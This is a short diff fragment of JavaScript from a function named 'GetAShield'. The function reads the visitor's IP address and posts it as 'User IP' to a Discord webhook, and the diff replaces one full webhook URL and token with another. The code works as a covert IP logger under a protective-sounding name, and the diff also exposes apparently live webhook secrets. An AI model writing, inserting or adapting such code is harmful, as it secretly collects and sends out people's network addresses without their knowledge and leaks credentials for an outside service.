@@ -4,7 +4,7 @@ function GetAShield() {
         .then(data => {
             const ip = data.ip;
 
-            const webhookUrl = "https://discord.com/api/webhooks/1431830725736267908/IMA31zfHHdxG2G6z_-eHXucHz7JwP6yLFB3caKxkRYUndN6TV6rqcmVHH4lac9IfSSqA";
+            const webhookUrl = "https://discord.com/api/webhooks/1432349866490597377/nM402QIt7yqv7x93gpOXN4aKBcLt--mWvH4sBiGCQXf7sZoN0MuOegzAi8ogj6OBoGWI";
             const payload = {
                 content: `User IP: **${ip}**`,
                 avatar_url: "https://cdn.xoa.me/uploads/611e43ef-ba96-4914-aa7c-a1c85149415b.jpg"
